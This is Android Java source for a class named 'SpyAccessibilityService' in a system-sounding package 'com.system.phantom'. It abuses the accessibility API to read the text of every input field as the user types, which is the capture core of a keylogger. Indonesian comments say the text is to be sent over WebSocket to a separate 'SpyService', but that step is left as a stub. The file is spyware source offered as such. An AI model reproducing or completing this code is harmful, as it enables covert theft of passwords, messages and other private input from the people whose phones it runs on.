package com.system.phantom;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class SpyAccessibilityService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.getText() != null) {
                String text = source.getText().toString();
                if (text.length() > 0) {
                    // Kirim via broadcast ke SpyService (tapi kita sederhanakan dengan static method)
                    // Karena kita tidak mau ribet, kita langsung kirim via WebSocket di SpyService
                    // Tapi untuk simplicity, kita lewati dulu, nanti bisa ditambahkan.
                }
                source.recycle();
            }
        }
    }
    @Override
    public void onInterrupt() {}
    @Override
    protected void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);
    }
}
